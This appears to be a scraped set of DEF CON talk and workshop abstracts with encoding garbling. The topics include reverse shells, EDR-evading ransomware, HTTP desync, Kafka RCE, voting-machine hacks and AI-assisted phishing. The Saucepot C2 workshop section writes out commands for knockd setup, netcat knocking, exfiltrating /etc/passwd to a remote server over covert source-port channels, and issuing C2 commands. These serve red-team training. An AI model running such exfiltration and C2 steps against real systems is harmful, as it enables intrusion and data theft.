<p>In the continuously evolving world of browser extensions, security remains a big concern. As the demand of feature-rich extensions increases, priority is given to functionality over robustness, which makes way for vulnerabilities that can be exploited by malicious actors. The danger increases even more for organizations handling sensitive data like banking details, PII, confidential org reports, etc. Damn Vulnerable Browser Extension (DVBE) is an open-source vulnerable browser extension, designed to shed light on the importance of writing secure browser extensions and to educate developers and security professionals about the vulnerabilities and misconfigurations that are found in browser extensions, how they are found, and how they impact business. This built-to-be-vulnerable extension can be used to learn, train, and exploit browser extension-related vulnerabilities.</p>

<p>Traditional digital security often falls short when applied to IoT environments, where devices are limited in processing power and exposed to a wider range of threats. Human vulnerabilitiesâespecially against deepfake-style attacksâfurther weaken current systems. Static biometrics like fingerprints or facial scans are no longer enough. This work proposes a new direction: using the brainâs unique electrical activity (EEG signals) as a security layer. These dynamic, hard-to-replicate patterns offer a way to authenticate users without storing sensitive data or relying on heavy computation. By grounding trust in the userâs own biological signals, this approach offers a lightweight, resilient solution tailored to the constraints of modern IoT devices.</p>

<p>Cypherpunks write code that is open source, privacy-oriented, decentralized, trust-minimized, verifiable/auditable, interoperable, and bundled in Linux distributions. Cypherpunks don't use Java. But in 2025 using Java 25 and Nix -- they can and should!</p>

<p>We will review how functional-style programming, minimalism, pattern-matching, native compilation and integration with C/C++/Rust through a new FFM mechanism are game-changers for Java developers and worthy of a second look by those who dismissed Java years ago.</p>

<p>In this session we will see how Nix can reliably build native and JIT-compiled tools and applications, how dependencies can be minimized and bootstrappability achieved.</p>

<p>We will compare Maven's bytecode packaging to the Nix model and how the two can be integrated while also brining in native libraries.</p>

<p>Real-world examples will be provided. We will look at the gaps that remain and how to close them so we can live the Java-cypherpunk dream and contribute to the ""Great Tree"".</p>

<p>As a London-based security researcher with a strong focus on open-source intelligence
(OSINT) and attack surface discovery, I am excited to attend the DEF CON conference for the
first time and contribute meaningfully to the Red Team Village. My passion lies in developing
and refining reconnaissance techniques that enable both offensive and defensive practitioners
to gain deeper insights into an organizationâs digital footprint.</p>

<p>During the RTV Tactics sessions, I will present a DNS-based OSINT methodology for
uncovering products and services through large-scale DNS TXT record scanning. This
previously unpublished approach demonstrates how certain TXT records can reveal not just
domain ownership or validation details, but also the presence of specific third-party services and
platforms in use. For instance, TXT entries like google-site-verification,
MS=msXXXXXXXX, or vendor-specific SPF includes can expose dependencies on Google
Workspace, Microsoft 365, or other cloud-based services.</p>

<p>By programmatically analyzing these records across large swaths of DNS zones, attackers can
construct detailed maps of an organization's technology stack and supply chain
affiliationsâcritical intelligence for targeted campaigns. This intelligence also provides
defenders with an opportunity to detect inadvertent information leakage and improve control
over external DNS configurations.</p>

<p>To support operational use, I have integrated this scanning technique into widely adopted
open-source tools such as Nuclei and Amass. These enhancements allow red teams and
security researchers to efficiently incorporate TXT record reconnaissance into broader discovery
workflows, elevating the precision and depth of traditional enumeration phases.</p>

<p>This session will equip attendees with practical, reproducible tactics for passive and semi-active
discovery that can uncover non-obvious attack vectors. Attendees will leave with actionable
insights and tooling that can be immediately applied to real-world engagements.</p>

<p>It would be an absolute honor to support the Red Team Village and give back to a community
that has been instrumental in shaping my growth as a researcher. I deeply value the Villageâs
mission to educate, inspire, and empower red teamers of all experience levels, and I am eager
to contribute to that mission by sharing knowledge that enhances our collective offensive
capabilities and understanding of adversarial tradecraft. Thank you for the opportunity to be
considered.</p>

<p>Can You Really Trust Your EDR? Spoiler: Attackers Donât â They Exploit It.</p>

<p>In the ever-evolving world of cybersecurity, attackers are one step ahead. But what happens when defenders rely on tools that attackers already know how to bypass? In this session, we dive deep into the mindset of adversaries and explore how modern Endpoint Detection and Response (EDR) systems are not the impenetrable fortress many think they are. As a defense researcher specializing in adversarial behavior, Iâve crafted a cross-platform ransomware (Windows, macOS, Linux) to understand the gaps in current defense mechanismsânot to cause harm, but to reveal how attackers think, act, and effortlessly slip past advanced defenses.</p>

<p>Through a live Proof of Concept (PoC) and in-depth technical walkthroughs, weâll uncover the persistent techniques, evasion strategies, and overlooked system behaviors that let ransomware thrive even in well-defended environments. This talk isnât meant to alarmâitâs an honest, reality-driven exploration of how attackers exploit EDRs, and more importantly, how defenders can bolster their security strategies.</p>

<p>For years, Pentestmonkey Reverse Shell Cheat Sheet defined the essentials of post-exploitation. Bash, Python, PHP, (G)Awk, Netcat and others were quick, simple and highly effective tools for gaining shell access. Today, those tools are the first to be flagged, restricted or removed. In real-world hardened environments, the old paths are closed. Meanwhile, new runtimes like Clojure, Racket, NATS-IO, Bun, Crystal, Red Language, Ballerina and others are becoming part of production environments, CI/CD pipelines and internal developer ecosystems, usually without security teams treating them as risks.</p>

<p>This workshop focuses on building practical, working reverse and bind shells using these modern runtimes. Participants will write their own payloads, test them live against targets and leave with working knowledge of how to survive without traditional tooling. Every shell demonstrated will be integrated into the Metasploit Framework with custom modules built for each runtime. Source code, victim and attacker virtual machines and pre-built environments will be provided to ensure every participant can practice during the session.</p>

<p>This is not a theory-heavy workshop. It is about operational survival when Python is gone, Netcat is restricted and standard shells are no longer viable. It is about turning runtimes that defenders ignore into reliable offensive footholds. Attendees will leave with ready-to-use payloads, working Metasploit extensions, and the technical knowledge to adapt to modern detection-heavy environments.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Port knocking is a stealthy network authentication technique (T1205.001) in which a client sends a specific sequence of connection attempts (or ""knocks"") to closed ports on a server. When the correct sequence is received, the server dynamically opens a port or triggers an action, enabling concealed access or communication. Saucepot C2 elevates the port knocking technique to a new level. Instead of using destination ports (DstPorts) in TCP sessions as knock sequences, it leverages source ports (SrcPorts), also known as ephemeral ports. This approach allows data exfiltration even in highly restrictive firewall environments where only a single outbound port, such as port 443, is allowed.</p>

<p>In this workshop, attendees will use Saucepot C2 in conjunction with the following MITRE ATT&amp;CK techniques to conduct specific Red Team activities:</p>

<h3 id=""hardwarerequirements"">Hardware requirements</h3>

<ul>
<li>One AWS EC2 t3.micro (or equivalent) VPC instance with at least 1 GB of RAM and 8 GB of storage to serve as the server</li>
<li>One AWS EC2 t3.micro (or equivalent) VPC instance (easier option), or a laptop (more difficult option), to serve as the client</li>
</ul>

<h3 id=""softwarerequirements"">Software requirements</h3>

<p>Server:
<code>
sudo apt install  net-tools knockd nginx python3-pip python3-scapy
git clone https://github.com/netskopeoss/saucepot
echo ""v2025.8"" | sudo tee /var/www/html/chk-version
</code></p>

<p>Client:
<code>
sudo apt install  net-tools python3-tqdm python3-psutil python3-pycurl
git clone https://github.com/netskopeoss/saucepot
</code></p>

<h3 id=""workshopdetails"">Workshop details</h3>

<ul>
<li>Exercise 1: Traditional port knocking
Reveal a web server running on port 80 using the port knocking technique. Once the correct knock sequence is provided, the firewall will be temporarily lifted for that specific client.</li>
</ul>

<p>Server:
Hide the web server until the correct knock sequences (4100, 4200, 4500) have been provided.</p>

<p><code>
sudo iptables -I INPUT -p tcp --dport 80 -j REJECT
sudo systemctl start nginx
</code></p>

<p>Add the following section to <code>/etc/knockd.conf</code>
<code>
[OpenCloseSecretWeb]
    sequence      = 4100,4200,4500
    seq_timeout   = 30
    tcpflags      = syn
    start_command = /usr/sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
    cmd_timeout   = 7200
    stop_command  = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
</code></p>

<p>If the default interface is not <code>eth0</code>, add <code>Interface = InterfaceName</code> to the <code>[options]</code> section.</p>

<p>Restart the knockd:
<code>
sudo systemctl restart knockd
</code></p>

<p>Client:</p>

<p>The protected web service should be unreachable by default.</p>

<p><code>
curl http://server_public_ip
</code></p>

<p>Provide the correct knock sequences; the protected web service should now be reachable.</p>

<p><code>
for f in 4100 4200 4500; do nc -w2 server_public_ip $f; done
curl http://server_public_ip
</code></p>

<ul>
<li><p>Exercise 2: Ephemeral port checker
Check whether you're in a friendly environment where the client's source port is preserved after NAT, a crucial requirement for ephemeral port abuse to work. If the laptop's network environment fails the test, an additional VPC instance will be needed to act as the client.</p>

<p>Server:
<code>
sudo systemctl stop nginx
sudo python3 saucepot-server.py -c -p 80
</code></p>

<p>Client:
```
python3 saucepot-client.py -c  -d server_public_ip  -p 80</p>

<p>Test 1 with ephemeral port 63034: PASS
Test 2 with ephemeral port 51151: PASS
Test 3 with ephemeral port 54321: PASS</p>

<p>Ephemeral port test succeeded. Enjoy Port Knocking 2.0 technique!
```</p></li>
<li><p>Exercise 3: Data exfiltration
Exfiltrate a specified file to the server without establishing persistent TCP connections. The connection state is managed through different port-knocking sequences, such as session-start and session-end. The data to be exfiltrated is transmitted via the source port (SrcPort) field of TCP packets within a designated port range.</p>

<p>Server:
<code>
sudo python3 saucepot-server.py -d 172.31.253.199  -p 80
</code></p>

<p>Client:
Exfiltrate <code>/etc/passwd</code> to the server</p>

<p><code>
python3 saucepot-client.py  -d server_public_ip  -p 80  --upload /etc/passwd
</code></p></li>
<li><p>Exercise 4: Command-and-control operations
To achieve bidirectional communication, theâ¯Last-Modifiedâ¯header in HTTP responses is used to deliver C2 commands to the client. Saucepot C2 currently supports a few simple commands, such asâ¯ls,â¯ps, and others.</p>

<p>Server:
<code>
sudo systemctl start nginx
sudo python3 saucepot-server.py -d 172.31.253.199  -p 80
</code></p>

<p>Client:
<code>
python3 saucepot-client.py  -d server_public_ip  -p 80
</code></p></li>
<li><p>Exercise 5: Observation of anomalies at L4 and L7
Observe the anomalies at L4 and L7</p>

<p>On the server, in two separate windows:</p>

<p>web access log:
<code>
tail -F /var/log/nginx/access.log
</code></p>

<p>SYN packets:
<code>
sudo tcpdump -i enX0 -n 'tcp[tcpflags] &amp; tcp-syn != 0'
</code></p></li>
</ul>

<p>This workshop has been verified on Ubuntu 24.04 LTS</p>

<h3 id=""troubleshootguide:"">Troubleshoot Guide:</h3>

<ul>
<li>Python packages required</li>
<li>VPC instance's inbound firewall to allow 80/tcp and those used in traditional port-knock sequences</li>
<li>Use VPC instance NIC's private IP address in exercise 3 &amp; 4 for the <code>-d ip</code> arg on Server</li>

<p>In today's hyper-connected world, one vulnerability remains reliably exploitable: the human. Social engineering -- the manipulation of people to gain unauthorized access or extract sensitive information -- continues to outpace technical exploits in both effectiveness and stealth. But in the age of AI, these attacks are evolving faster, becoming more scalable, convincing, and harder to detect.</p>

<p>This talk explores the many faces of modern social engineering: from classic phishing, vishing, and physical intrusion, to AI-generated phishing emails, deepfake voice calls, and synthetic identities crafted by language models. We'll walk through real-world scenarios where attackers exploit trust, urgency, charm, and emotionâÃÃ®now enhanced by tools that can replicate human tone, write believable pretexts, and automate reconnaissance at scale.</p>

<p>You'll leave with a deeper understanding of how AI is supercharging social engineering, what this means for defenders and red teamers alike, and how to recognize the increasingly subtle cues of human-targeted compromise.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In the March 2020 'Super Tuesday' Primary Election, LA County debuted its brand new, $300 million, bespoke, Smartmatic-contracted VSAP (Voting Solutions for All People) voting system. Before the night was over, the Bernie Sanders presidential campaign had already filed suit (due to multiple technology failures resulting in hours-long lines). That election night proved to be illustrative of the myriad problems with VSAP, including numerous security vulnerabilities. These were compounded by the failure to fulfill a much-ballyhooed commitment by the County to disclose the source code. Perhaps the most significant failing was only revealed weeks later after the machine count had finally been completed. A knife's edge result in LA County's second largest city, Long Beach, for a local ballot measure, led to a voter-requested recount and an eye-opening odyssey for a local government accountability grassroots organization. Ian Patton will discuss that journey in pursuit of a simple and accurate local election result.</p>

<p>Gaining access isnât always about having the perfect pretext. Sometimes, itâs about recognizing subtle shifts in the environment, reading behavioral cues, and adapting on the fly. The best social engineers, like master photographers, donât just planâthey wait for the decisive moment and take action when the time is right.</p>

<p>This session unpacks a real-world infiltration where success wasnât about meticulous scripting, but about understanding when and how to pivot in real time. By integrating principles from photography, literature, theater, and deception, we explore how presence, timing, and perception shape the art of infiltration.</p>

<p>CICDGuard is a graph based CICD ecosystem visualizer and security analyzer -
1. Represents entire CICD ecosystem in graph form, providing intuitive visibility and solving the awareness problem
2. Identifies common security flaws across supported technologies and provides industry best practices for identified flaws adhering to OWASP CICD Top10
3. Identifies the relationship between different technologies and demonstrates how vulnerability in one component can affect one or more other technologies
4. Technologies supported - GitHub, GitHub Action, Jenkins, JFrog, Spinnaker, Drone</p>

<p>CICD platforms are an integral part of the overall software supply chain and it processes a lot of sensitive data, compromise of which can affect the entire organization. One of the challenges with security OF CICD, like most areas of security, is the lack of visibility of what actually makes a CICD ecosystem. Security starts with being aware of what needs to be secure.</p>

<p>A deep dive into the realities of cybercrime across Africa, with a focus on understandingânot just condemningâthe digital hustler phenomenon. Drawing from the work of GoLegit Africa, a pioneering initiative focused on cybercrime rehabilitation and skills development, this session explores how economic hardship, digital opportunity, and social pressures intersect to fuel a growing underground cyber economy.</p>

<p>Weâll examine real-world tactics used by African cybercriminalsâfrom phishing rings and business email compromise to deepfake scams and online fraudâand explore how these ""playbooks"" are learned, refined, and shared. Through case studies and field insights, the presentation reveals how some youths see cybercrime not as deviance, but as digital entrepreneurship in the absence of alternatives.</p>

<p>This talk goes beyond exposure; it introduces GoLegitâs model for interventionâusing mentorship, ethical hacking training, and reintegration pathways to turn cyber skills toward positive outcomes. Itâs a session for those interested in threat intelligence, socio-economic roots of cybercrime, and how community-led solutions can help disrupt the pipeline from poverty to online criminality.</p>

<p>Bug bounty hunting is often portrayed as methodical recon, crafted payloads, and targeted testing. But sometimes, the most interesting vulnerabilities donât come from planned attacks â they come from the chaos. In this talk, Iâll walk through a handful of real bugs Iâve reported over the years that found me instead. 
From unexpected blind XSS triggers in places I wasnât even actively testing, to getting quietly added to internal distribution lists and receiving sensitive data I never asked for, to those classic âWTFâ moments that every seasoned hunter has experienced â this talk highlights the unpredictable and serendipitous side of bug bounty. </p>

<p>Weâll explore how these moments happened, what they revealed about the systems in question, and what they taught me about staying alert beyond traditional recon. Whether youâre an experienced hunter or just getting started, this talk is a reminder that in bug bounty, sometimes the best findings arenât hunted â theyâre stumbled into.</p>

<p>XSS in modern React apps isn't gone, it's just hiding in new places. In this workshop, we'll expose how React createElement can be your way in. We'll walk through several React DOM XSS lab scenarios based on real bug bounty findings from vulnerable applications in the wild. You'll see how untrusted input can make its way from a variety of realistic sources to a React createElement sink, leading to exploitable XSS, even in apps built with frameworks like Next.js. These labs are realistic, grounded in actual bugs, and designed to sharpen your ability to spot and exploit DOM XSS in the kinds of apps bounty hunters hit every day.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Trying to trace an attacker pivoting from AWS to Azure to GCP often feels like building detections in silos while attackers exploit the seams. As detection engineers (DEs), we know the pain: scattered logic, cloud-specific alerts, and a fragmented view. We need to move beyond individual events and reconstruct the cross-cloud kill chain to see the full attack.</p>

<p>This DEF CON Lightning Talk is a practical DE playbook for AWS, Azure, and GCP. No fluff, just 'how-to' for building detections that connect the dots across clouds.</p>

<p>In ~15 minutes, weâll cover:
Cross-Cloud TTPs: How attackers really pivot between AWS, Azure &amp; GCP in 2025 and the patterns they leave.
Mapping Logs to Kills: Identifying essential logs (CloudTrail, Azure AD, GCP Audit, etc.) and mapping them to attack stages.
Crafting Correlation Rules: Real SIEM examples (Sentinel/Chronicle/etc.) for stitching events together â think 'Azure Risky Login' + 'AWS Role Use' = P1 Alert.
Actionable DE Strategies: Threat intel integration, baselining cross-cloud activity, and building high-fidelity alerts.
Automation &amp; OCSF: Streamlining ingestion and normalization so you can focus on the hunt.
If you write detection rules or hunt threats in a multi-cloud mess, this is for you. You'll leave with actionable TTPs, correlation logic examples, and a clear path to building detections that reveal the entire cross-cloud kill chain. Let's build better traps.</p>

From research and processes irrelevant to security (i.e. Monte-Carlo simulations) to essential security functionality like secret generation, random number generation plays a significant part in our ability to utilize the modern internet. In turn, they have a unique history, threat model, and set of applications. We will discuss the history of pseudo-random number generation, the types of random number generators, where they are supposed to be utilized, and how to break them, when relevant. Additionally, we will discuss the future direction of random number generation in light of preparation for the advent of large-scale quantum computing.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Apache Kafka is an open-source distributed event streaming platform. At the heart of Kafka lies the Broker, which acts as the central server node in a Kafka cluster. Brokers are responsible for storing streams of data and managing the flow of messages between producers and consumers. The Kafka Server we often refer to is essentially the Kafka Broker.</p>

<p>While Kafkaâs main system handles data streams well, its real strength comes from its growing ecosystem. The components in the ecosystem greatly expands its abilities: Confluent ksqlDB transforms raw streams into queryable tables for real-time analytics; Schema Registry standardizes data formats across microservices, and so on.</p>

<p>However, behind the rich components lie hidden security threats. Prior research has revealed Remote Code Execution (RCE) vulnerabilities in Kafka Client, yet notably absent were any exploitable RCE vulnerabilities in the Kafka Server â until now. In this work, we present the first-ever RCE vulnerability affecting Kafka Server itself. At the same time, we also used similar techniques to attack other components in the Kafka ecosystem. And these vulnerabilities can also affect the cloud service providers themselves. What's more, Since Kafka users remain unaware of this risk, thousands of Kafka servers are now exposed to this RCE vulnerability.</p>

<p>This presentation explores the broader implications of insecure firmware, broken update mechanisms, and the surprising autonomy of devices many assume to be simple peripherals.</p>

<p>We share how we traced the tech stack from brand-name distributors back to little-known chipset manufacturers, and what that journey revealed about responsibility, transparency, and the risks of neglecting security at the hardware-software boundary.</p>

I'll show you Claude's unexpected wins (landing in the top 3% globally in PicoCTF and successfully fending off red team attacks at CCDC) alongside its entertaining fails (devolving into security philosophy when overwhelmed, making up flags for PlaidCTF when stuck).</p>

<p>Drawing on these results, I'll break down the technical challenges we conquered, from building specialized tooling harnesses to keeping Claude coherent during 16+ hour competitions. This presentation will demonstrate how competitive environments reveal both the impressive capabilities and amusing limitations of today's AI systems when operating in adversarial scenarios.

<p>Learn how to build a state-of-the-art quantum sensor, no physics PhD necessary! </p>

<p>Quantum Technology may sound like a faraway ultra-neon cyber fever dream, and in the case of quantum computing it may be some time before weâre swapping QPUs on our laptopsâ¦ But Quantum Sensing is here, and we felt the time was about right to break open this technology for all.</p>

<p>We designed and are releasing the first ever fully open source, hackable quantum sensor. Utilising common off the shelf parts, and a sample of Nitrogen-Vacancy Centre Diamond, we will be able to measure magnetic fields with light. We will show you how to build your own device, what tech is required, and how to get a signal from the diamond. Weâll discuss some of the use cases of these sensors, from medtech to defeating GPS jamming. Then weâll show you how to hack with it, taking the first steps to using these sensors to infer the behaviour of a chip via magnetometry. #QuantumHackers</p>

<p>This talk is the main demonstration of this yearâs Quantum Village Badge - an actual quantum sensor released for the International Year of Quantum. Whilst others will make you think that you need advanced degrees and an expensive lab, weâll be building quantum sensors in our garages and pushing the limits of this brand new technology; Access All Atoms!</p>

<p>Every once in a while, we get a grim reminder that the open-source trust model that enables developers to use each otherâs code and resources can be abused by attackers.</p>

<p>GitHub users recently suffered from such a wake-up call. In March 2025, the highly-publicized ""tj-actions"" incident came to light, throwing many GitHub organizations and users into panic, as their credentials were leaked via their supply chain. But while the masses were scared about the massive credential exposure, we were able to piece together evidence to show that the leakage wasn't the primary goal of this attack, and that the initial buzz was just the tip of the iceberg. Our investigations indicate that more highly-popular projects were targeted as part of this campaign, and DefCon will be the first place that we reveal the newly-discovered details.</p>

<p>Weâll reveal how the attack began months earlier than initially believed, with the attacker compromising multiple open-source projects utilizing them for lateral movement. We'll detail how the adversary maintained a low profile, patiently waiting to spear-target Coinbase. We will dissect the sophisticated evasion techniques employed and the attackerâs modus operandi, showing how the open-source access and trust model were weaponized to deliver a precise and calculated supply chain attack.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>As software supply chains embrace transparency through SBOMs, hardware remains a black box. Yet the chips inside our IoT devices carry just as much â if not more â risk. From cloned components to opaque fabs, the semiconductor supply chain is fast becoming a national security flashpoint. Governments are scrambling to respond with blunt tools like bans and onshoring, but these approaches are slow, costly, and often impractical.  Traditional BOMs focus on procurement and production â what gets bought and assembled â but they rarely capture origin, integrity, or risk context. They werenât built to expose inter-organizational dependencies or detect supply chain manipulation.  Enter the HBOM Initiative â a new effort to bring visibility, traceability, and accountability to the hardware supply chain. By developing tools and practices for a hardware bill of materials (HBOM), we aim to expose hidden risks, trace chip provenance, and empower sectors to make smarter, risk-informed decisions without sacrificing adaptability or innovation.  This talk will explore why HBOMs are inevitable, what makes them hard, and how the hacker and security community can help shape the future of hardware trust.</p>

<p>La Inteligencia Artificial estÃ¡ dejando de ser una promesa futurista para convertirse en una herramienta tangible y poderosa en el presente de la ciberseguridad. En esta charla, presentamos un recorrido tÃ©cnico y estratÃ©gico por el impacto de la IA en el mundo del pentesting, centrÃ¡ndonos especialmente en el proyecto PentestGPT, una de las iniciativas mÃ¡s innovadoras en este campo.<em>x000D</em>
<em>x000D</em>
PentestGPT es un modelo que busca automatizar y asistir tareas tradicionalmente realizadas por humanos durante pruebas de penetraciÃ³n, desde el reconocimiento y la enumeraciÃ³n hasta la explotaciÃ³n de vulnerabilidades. Su funcionamiento se basa en una combinaciÃ³n de capacidades de procesamiento de lenguaje natural, razonamiento contextual y un conocimiento actualizado de vectores de ataque y tÃ©cnicas ofensivas. MÃ¡s que una herramienta, se estÃ¡ convirtiendo en un copiloto para analistas de seguridad, reduciendo los tiempos de anÃ¡lisis, potenciando la documentaciÃ³n tÃ©cnica y permitiendo que los profesionales puedan enfocarse en lo estratÃ©gico y no solo en lo operativo.<em>x000D</em>
<em>x000D</em>
A lo largo de la charla analizamos las capacidades actuales de la IA aplicada al pentesting, asÃ­ como sus limitaciones, sesgos y riesgos de uso. Discutimos escenarios donde PentestGPT puede aportar verdadero valor (por ejemplo, en entornos con recursos limitados o como apoyo en red teams), y tambiÃ©n advertimos sobre los peligros de una confianza ciega en la automatizaciÃ³n. Asimismo, abordamos casos reales de uso, ejemplos prÃ¡cticos y demostraciones que ilustran cÃ³mo interactuar con este tipo de sistemas.<em>x000D</em>
<em>x000D</em>
Pero esta charla no es solo sobre herramientas. Es una invitaciÃ³n a reflexionar sobre cÃ³mo se redefine el rol del pentester frente a estas tecnologÃ­as, cÃ³mo impacta en las metodologÃ­as tradicionales y quÃ© desafÃ­os Ã©ticos y tÃ©cnicos se presentan al incorporar inteligencia artificial a procesos ofensivos. Â¿Hasta dÃ³nde podemos delegar? Â¿QuÃ© responsabilidad tenemos como profesionales al utilizar estos sistemas?<em>x000D</em>
<em>x000D</em>
Presentada por 2 lÃ­deres de seguridad en Argentina, esta sesiÃ³n busca abrir el debate, compartir experiencia prÃ¡ctica y aportar una mirada crÃ­tica sobre el presente y futuro del pentesting en la era de la IA. Una charla pensada tanto para quienes ya estÃ¡n explorando estas tecnologÃ­as, como para quienes reciÃ©n comienzan a preguntarse quÃ© lugar ocuparÃ¡n en su dÃ­a a dÃ­a profesional.</p>

Recent incidents, such as the Lab Dookhtegan hacker group's attack on Iranian ship networks and the demonstration of firmware reverse engineering and remote root exploitation targeting VSAT modems (e.g., Newtec MDM2200) at DEFCON, highlight the critical security challenges associated with VSAT systems. Against this backdrop, our research team presents a detailed overview of our ongoing research since 2023, encompassing the collection and re-hosting of VSAT firmware, as well as systematic vulnerability analysis through the ACU web interface. Specifically, we provide an in-depth analysis and demonstration of recently discovered VSAT ACU web vulnerabilities (CVE-2023-44852 ~ CVE-2023-44857). Additionally, we describe the application of experimental testbed environments based on the methodology proposed in the paper ""Securing Maritime Autonomous Surface Ships: Cyber Threat Scenarios and Testbed Validation."" This research aims to thoroughly analyze the security vulnerabilities and attack potentials inherent in VSAT systems, emphasizing the importance of strengthening maritime cyber security and fostering international collaboration, while providing practical recommendations for policy and technological enhancements.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The CVE Program has been a cornerstone of cybersecurity for over two decades, but its original design was never meant to support AI-discovered vulnerabilities, real-time coordination, or global software supply chains. The CVE Program has evolved from a technical utility to become a pillar of public cybersecurity policy. As governments craft regulation around vulnerability disclosure, product security, and software liability, the CVE system is increasingly at the center of the conversation, but innovation in vulnerability discovery has outpaced innovation in vulnerability tracking, lagging behind the needs of policy, industry, and international coordination.  </p>

<p>This panel will explore how public policy can promote innovation within the CVE Program to meet growing global expectations. Topics will include how AI and automation can modernize disclosure at scale, how CVE labelling can evolve with emerging technologies, and how solutions must address the risk of fragmentation (national vulnerability databases and duplicative disclosure systems) to be future proof.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Effective phishing campaigns traditionally demand extensive manual effort, involving detailed target reconnaissance, crafting believable scenarios, and setting up infrastructure. These manual processes significantly restrict scalability and customization. This talk explores a practical approach to leveraging Generative AI for automating core aspects of phishing workflows, drawing on direct experiences and real-world threat actors such as Emerald Sleet, Crimson Sandstorm, and Charcoal Typhoon.</p>

<p>The session thoroughly compares results from different models and platforms, including OpenAI ChatGPT, Anthropic Claude, and local alternatives, highlighting distinct strengths, weaknesses, and techniques for optimizing outcomes. Attendees will gain insights into deploying an end-to-end phishing campaign, emphasizing the models' effectiveness in reducing the technical barrier of scaling phishing attacks. Finally, the talk underscores that while AI significantly enhances operational efficiency, it functions best when complemented by human judgment and expertise, reinforcing the critical human factor in cybersecurity practices.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Using the Dominion touchscreen BMD debuted at Voting Village 2023, we will discuss and demonstrate in real-time how technically simple ""hacks"" to the ballot displayed on the voterâs touchscreen can directly impact the vote count, or alternatively impact the voterâs decisions. These simple âhacksâ to the election definition (with no need to inject malware) include the manipulation of display of candidate choices, silent removal of candidates from the display, and using false instructions on the touchscreen to intentionally misinform voters regarding candidates or ballot questions. Furthermore, attempting to determine/recover from such hacks on the election outcomes can range from difficult to impossible. In addition to discussing the tactics and potential impacts, we will illuminate underlying system design decisions which enabled such hacks to be technically simple, feasible, and easily executable. The knowledge and tools used/discussed were obtained through public means and public websites, available to an unlimited number of people. This talk will focus on the general methodology and ease of the vote manipulation, the range of impacts, the feasibility and scalability. Immediately following the on-stage presentation, a deeper dive into the technical aspects will occur in the adjacent Voting Village lab room.</p>

<p>Twentyâfour months ago we presented the Black Hat talk ""Evil Digital Twin"" in which we demonstrated how large language models (LLMs) could readily exploit the cognitive vulnerabilities of users, and that humans would perceive AI as sentient long before true artificial general intelligence emerge.
Join us for this twoâhour workshop as we walk you through the basic architecture of human digital twins (HDTs), trained on the core patterns of human individuals, may be deployed to simulate both the targets of social engineering attacks or operate as high-fidelity honey pots.
We also explore a coming future of persistent cognitive cyberâwarfare, escalating as the cost of deception approaches zero and the attack surface shifts from networks to minds. Audience members will interact with SCOTOBOT (a human digital twin of a Supreme Court Justice), meet a perfect AI assistant for insider threat, and leave with a NIST researchâbased LLM that speaks in phishing emails.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Cybersecurity is currently in a state of crisis, and it is imperative that we confront this issue head-on. The increasing aggressiveness and sophistication of adversaries is not the primary concern; rather, our approach to tackling these threats is a significant part of the problem. In the realm of defending against cyberattacks, it is not the probabilities that count, but rather the actions we take. Many well-known cybersecurity tools from both large enterprises and startups often fail to deliver on their promises or provide misleading, if not outright fraudulent, data. The notion that vendors frequently misrepresent their capabilities is, as the saying goes, ""a tale as old as time."" However, the idea that these vendors may be so convincing because they genuinely believe in their own fabrications is particularly thought-provoking. In this discussion, we will delve into the realities surrounding cybersecurity vendors, certifications, and a range of other contentious topics within the cyber domain. If youâre ready for a honest look at the state of cyber, this session is for you.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Modern websites have evolved into complex, layered network architecturesâcreating fertile ground for serious protocol-level vulnerabilities that traditional tools often overlook. As web applications continue growing in complexity, critical vulnerabilities such as HTTP smuggling, first-request routing, and cache poisoning/deception become increasingly prevalent, underscoring the need for tooling that treats HTTP as it truly is: a stream-based protocol. </p>

<p>Although security professionals commonly rely on HTTP proxies to intercept, analyze, and manipulate traffic, most current solutions obscure the stream-oriented nature of the protocol. By presenting HTTP interactions merely as isolated request-response transactions, crucial detailsâlike persistent connections, pipelining, and geo-routingâare concealed, making it difficult to fully comprehend data flows or uncover advanced attack vectors. </p>

<p>In this session, Iâll present a new Burp extension to dive deep into the raw streams powering HTTP, turning overlooked details into powerful exploits. Youâll learn how to spot hidden proxies, exploit subtle errors to desynchronize connections, hijack requests, and uncover vulnerabilities that evade traditional tools. Through real-world case studies, Iâll reveal exactly how you can chain advanced HTTP Desync attacks to secure bounties that others have left behindâtransforming complex network architectures into your own bug bounty playground!</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Federated Credentials are one of the ways to authenticate workload identities and provide access to resources using Open ID Connect (OIDC), and major identity providers such as Entra ID (formerly known as Azure AD) support authentication using federated credentials. Developers set up a trust relationship between federated identity providers and workload identities. Often times due to a misconfiguration or lack of understanding of federated credentials security risks, developers have dangling domains configured as issuer in the setup. Due to the inherent trust relationship configured with the federated identity provider, an attacker can take over the dangling issuer domain, host OIDC discovery endpoints and obtain access tokens to elevate privileges. </p>

<pre><code> This talk aims to highlight the risks of dangling issuers and demonstrates how an attacker can exploit them to elevate privileges. In addition, the talk also covers mitigations and best practices and provides tools to identify these misconfigurations.  The demos used in this session leverage Microsoft Entra ID as the identity provider and Azure as the cloud hosting platform. However, the key takeaways are generic and are applicable to other cloud environments and identity providers.

<font size=""+1""><strong>Description:</strong></font><br>
